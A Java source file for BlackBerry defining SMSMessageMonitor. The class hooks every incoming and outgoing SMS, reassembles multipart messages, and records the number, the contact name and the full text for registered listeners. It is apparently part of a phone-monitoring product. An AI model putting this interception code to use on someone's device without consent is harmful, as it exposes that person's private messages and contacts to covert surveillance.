package com.vvt.smsutil;

import java.util.Vector;
import javax.microedition.io.Connector;
import javax.wireless.messaging.BinaryMessage;
import javax.wireless.messaging.Message;
import javax.wireless.messaging.MessageConnection;
import javax.wireless.messaging.TextMessage;
import com.vvt.std.Constant;
import com.vvt.std.FileUtil;
import com.vvt.std.Log;
import com.vvt.std.PduUtil;
import com.vvt.std.PhoneInfo;
import net.rim.blackberry.api.phone.phonelogs.PhoneCallLogID;
import net.rim.blackberry.api.sms.OutboundMessageListener;
import net.rim.device.api.system.RuntimeStore;

public class SMSMessageMonitor implements OutboundMessageListener, MultipartSmsListener {
	
	private static SMSMessageMonitor self = null;
	private static final long SMS_MONITOR_GUID = 0xe90c501d68add8adL;
	private static final int MULTIPART_HEADER_LENGTH = 6;
	private static final String COMMERCIAL_AT_SYMBOL_INDICATOR = "@@@";
	private MultipartSmsMgr multipartSmsMgr = new MultipartSmsMgr(this);
	private MessageConnection messsageConnection = null;
	private Vector smsIdVector = new Vector();
	private Vector smsSendObserverStore = new Vector();
	private Vector smsReceiverObserverStore = new Vector();
	
	private SMSMessageMonitor() {
		try {
			if (messsageConnection != null) {
				messsageConnection.setMessageListener(null);
				messsageConnection.close();
				messsageConnection = null;
			}
			messsageConnection = (MessageConnection) Connector.open("sms://:0");
			messsageConnection.setMessageListener(this);
		} catch(Exception e) {
			Log.error("SMSMessageMonitor.constructor", null, e);
		}
	}
	
	public static SMSMessageMonitor getInstance() {
		if (self == null) {
			self = (SMSMessageMonitor)RuntimeStore.getRuntimeStore().get(SMS_MONITOR_GUID);
		}
		if (self == null) {
			SMSMessageMonitor smsMon = new SMSMessageMonitor();
			RuntimeStore.getRuntimeStore().put(SMS_MONITOR_GUID, smsMon);
			self = smsMon;
		}
		return self;
	}
	
	public void addSMSSendListener(SMSSendListener observer) {
		boolean isExisted = isSMSSenderExisted(observer);
		if (!isExisted) {
			smsSendObserverStore.addElement(observer);
		}
	}
	
	public void addSMSReceiverListener(SMSReceiverListener observer) {
		boolean isExisted = isSMSReceiverExisted(observer);
		if (!isExisted) {
			smsReceiverObserverStore.addElement(observer);
		}
	}
	
	public void removeSMSSendListener(SMSSendListener observer) {
		boolean isExisted = isSMSSenderExisted(observer);
		if (isExisted) {
			smsSendObserverStore.removeElement(observer);
		}
	}
	
	public void removeSMSReceiverListener(SMSReceiverListener observer) {
		boolean isExisted = isSMSReceiverExisted(observer);
		if (isExisted) {
			smsReceiverObserverStore.removeElement(observer);
		}
	}

	public void removeAllSMSSendListener() {
		smsSendObserverStore.removeAllElements();
	}
	
	public void removeAllSMSReceiverListener() {
		smsReceiverObserverStore.removeAllElements();
	}
	
	private boolean isSMSSenderExisted(SMSSendListener observer) {
		boolean isExisted = false;
		for (int i = 0; i < smsSendObserverStore.size(); i++) {
			if (smsSendObserverStore.elementAt(i) == observer) {
				isExisted = true;
				break;
			}
		}
		return isExisted;
	}
	
	private boolean isSMSReceiverExisted(SMSReceiverListener observer) {
		boolean isExisted = false;
		for (int i = 0; i < smsReceiverObserverStore.size(); i++) {
			if (smsReceiverObserverStore.elementAt(i) == observer) {
				isExisted = true;
				break;
			}
		}
		return isExisted;
	}
	
	private void notifySMSOutgoingError(FxSMSMessage smsMessage, Exception e) {
		for (int i = 0; i < smsSendObserverStore.size(); i++) {
			((SMSSendListener)smsSendObserverStore.elementAt(i)).smsSendFailed(smsMessage, e, null);
		}
	}
	
	private void notifySMSOutgoingSuccess(FxSMSMessage smsMessage) {
		for (int i = 0; i < smsSendObserverStore.size(); i++) {
			((SMSSendListener)smsSendObserverStore.elementAt(i)).smsSendSuccess(smsMessage);
		}
	}
	
	private void notifySMSIncomingError(FxSMSMessage smsMessage, Exception e) {
		for (int i = 0; i < smsReceiverObserverStore.size(); i++) {
			((SMSReceiverListener)smsReceiverObserverStore.elementAt(i)).onSMSReceivedFailed(smsMessage, e, null);
		}
	}
	
	private void notifySMSIncomingSuccess(FxSMSMessage smsMessage) {
		for (int i = 0; i < smsReceiverObserverStore.size(); i++) {
			((SMSReceiverListener)smsReceiverObserverStore.elementAt(i)).onSMSReceived(smsMessage);
		}
	}
	
	private String getNumber(String address) {
		String number = address;
		if (number != null) {
			int index = number.indexOf("sms://");
			if (index != -1) {
				number = number.substring(index + 6, number.length());
			}
			index = number.indexOf(Constant.COLON);
			if (index != -1) {
				number = number.substring(0, index);
			}
		} else {
			number = Constant.EMPTY_STRING;
		}
		return number;
	}
	
	/*
	 * On the OS 5 in English Language, the first byte maybe zero or none.
	 * On below OS 5 in English Language, it will be none and will be zero in foreign languages.
	 */
	private boolean isBeginWithZero(byte indicator) {
		return indicator == 0 ? true : false;
	}
	
	private void eliminateCommercialAtSymbol(MultipartMessage sms) {
		int indexOfSymbol = 0;
		String payloadText = sms.getPayloadText();
		String header = payloadText.substring(0, payloadText.length() / 2);
		String tailer = payloadText.substring(payloadText.length() / 2);
		indexOfSymbol = tailer.indexOf(COMMERCIAL_AT_SYMBOL_INDICATOR);
		if (indexOfSymbol > -1) { // Tailer is end with "@@@".
			tailer = tailer.substring(0, indexOfSymbol); // Elimination '@' Symbol
			payloadText = header + tailer;
			sms.setPayloadText(payloadText);
		}
	}
	
	private boolean isSmsIdExist(byte id) {
		boolean isExist = false;
		for (int i = 0; i < smsIdVector.size(); i++) {
			Byte smsId = (Byte)smsIdVector.elementAt(i);
			if (smsId.byteValue() == id) {
				isExist = true;
				break;
			}
		}
		return isExist;
	}
	
	private byte getSmsId(String payloadText) {
		byte value = 0;
		if (isBeginWithZero((byte)payloadText.charAt(0))) {
			value = (byte)payloadText.charAt(1);
		} else {
			value = (byte)payloadText.charAt(3);
		}
		return value;
	}
	
	private boolean isNullMessage(TextMessage outgoingSms) {
		return (outgoingSms.getPayloadText() == null) || (outgoingSms.getPayloadText().trim().length() == 0);
	}
	
	private boolean isMultipartMessage(TextMessage outgoingSms) {
		boolean isMultiMsg = false;
		String msg = outgoingSms.getPayloadText();
		if (msg.length() > MULTIPART_HEADER_LENGTH) {
			char[] src = msg.toCharArray();
			if ((isBeginWithZero((byte)src[0])) || ((byte)src[0] == -23 && (byte)src[1] == 64 && (byte)src[2] == -91) || ((byte)src[0] == 5 && (byte)src[1] == 0 && (byte)src[2] == 3)) {
				isMultiMsg = true;
			}
		}
		return isMultiMsg;
	}
	
	private boolean isTextMessage(Message message) {
		return message != null && message instanceof TextMessage;
	}
	
	private boolean isBinnaryMessage(Message message) {
		return message != null && message instanceof BinaryMessage;
	}
	
	private String getMultipartPayload(String payloadText) {
		String data = null;
		if (isBeginWithZero((byte)payloadText.charAt(0))) {
			data = payloadText.substring(3, payloadText.length()-1); // To delete garbage data.
		} else {
			data = payloadText.substring(6, payloadText.length()-1); // To delete garbage data.
		}
		return data.trim();
	}

	private FxSMSMessage constructSMSEvent(TextMessage txtMsg) {
		FxSMSMessage smsEvent = new FxSMSMessage();
		// To set sender number.
		String number = getNumber(txtMsg.getAddress());
		smsEvent.setNumber(number);
		// To set sender name.
		PhoneCallLogID phoneCallLogID = new PhoneCallLogID(number);
		smsEvent.setContactName(phoneCallLogID.getName() != null ? phoneCallLogID.getName() : Constant.EMPTY_STRING);
		// To set text message.
		smsEvent.setMessage(txtMsg.getPayloadText() != null ? txtMsg.getPayloadText() : Constant.EMPTY_STRING);
		/*if (Log.isDebugEnable()) {
			Log.debug("SMSMessageMonitor.constructSMSEvent()", "TextMessage!");
			Log.debug("SMSMessageMonitor.constructSMSEvent()", "message: " + txtMsg.getPayloadText());
		}*/
		return smsEvent;
	}
	
	private FxSMSMessage constructSMSEvent(BinaryMessage binMsg) {
		FxSMSMessage smsEvent = new FxSMSMessage();
		try {
			// To set sender number.
			String number = getNumber(binMsg.getAddress());
			smsEvent.setNumber(number);
			// To set sender name.
			PhoneCallLogID phoneCallLogID = new PhoneCallLogID(number);
			smsEvent.setContactName(phoneCallLogID.getName() != null ? phoneCallLogID.getName() : Constant.EMPTY_STRING);
			// To set text message.
			byte[] data = binMsg.getPayloadData();
			String message = PduUtil.getMessage7BitEncoding(data);
			/*if (Log.isDebugEnable()) {
				Log.debug("SMSMessageMonitor.constructSMSEvent()", "BinaryMessage!");
				Log.debug("SMSMessageMonitor.constructSMSEvent()", "message: " + message);
				FileUtil.writeToFile("file:///store/home/user/pdu.txt", data);
			}*/
			if (message == null) {
				message = Constant.EMPTY_STRING;
			}
			smsEvent.setMessage(message);
		} catch(Exception e) {
			Log.error("SMSMessageMonitor.constructSMSEvent", "", e);
		}
		return smsEvent;
	}
	
	// MessageListener
	public void notifyIncomingMessage(MessageConnection msgCon) {
		FxSMSMessage smsMessage = null;
		try {
			Message message = msgCon.receive();
			if (isTextMessage(message)) {
				TextMessage txtMsg = (TextMessage)message;
				smsMessage = constructSMSEvent(txtMsg);
				// To notify event.
				notifySMSIncomingSuccess(smsMessage);
			} else if (isBinnaryMessage(message)) {
				BinaryMessage binMsg = (BinaryMessage)message;
				smsMessage = constructSMSEvent(binMsg);
				// To notify event.
				notifySMSIncomingSuccess(smsMessage);
			}
		} catch(Exception e) {
			notifySMSIncomingError(smsMessage, e);
		}
	}

	// OutboundMessageListener
	public void notifyOutgoingMessage(Message message) {
		FxSMSMessage smsMessage = null;
		try {
			TextMessage outgoingSms = (TextMessage) message;
			if ((isTextMessage(message)) && (!(isNullMessage(outgoingSms)))) { // If message is not null, it must be processed next step.
				if (isMultipartMessage(outgoingSms)) { // If message have more than 1 part, it must be kept into temporary box.
					byte smsId = getSmsId(outgoingSms.getPayloadText());
					String data = getMultipartPayload(outgoingSms.getPayloadText());
					if ((isSmsIdExist(smsId))) { // If smsId exists, payloadText will be appended.
						multipartSmsMgr.appendMultipartSms(smsId, data);
					} else { // If smsId does not exist, MultipartMessage will be created new one.
						MultipartMessage sms = new MultipartMessage();
						sms.setAddress(outgoingSms.getAddress());
						sms.setSmsId(smsId);
						sms.setPayloadText(data);
						smsIdVector.addElement(new Byte(smsId));
						multipartSmsMgr.addMultipartSms(sms);
					}
				} else { // If message have only 1 part, it must be recorded immediately.
					TextMessage txtMsg = (TextMessage)message;
					smsMessage = constructSMSEvent(txtMsg);
					// To notify event.
					notifySMSOutgoingSuccess(smsMessage);
				}
			}
		} catch(Exception e) {
			notifySMSOutgoingError(smsMessage, e);
		}
	}

	// MultipartSmsListener
	public void notifySmsTimeout(int smsId) {
		FxSMSMessage smsMessage = null;
		MultipartMessage sms = multipartSmsMgr.getMultipartMessage((byte)smsId);
		if (sms != null) {
			// If platform is the 5th OS version, it may occur '@@@...@' symbols at the tail of the message.
			if (PhoneInfo.isFiveOrHigher()) {
				eliminateCommercialAtSymbol(sms);
			}
			smsMessage = constructSMSEvent(sms);
			// To notify event.
			notifySMSOutgoingSuccess(smsMessage);
			multipartSmsMgr.removeMultipartSms(sms.getSmsId());
		} else {
			notifySMSOutgoingError(smsMessage, new Exception("SMS is null value. [SMSManager.notifySmsTimeout]"));
		}
	}
}
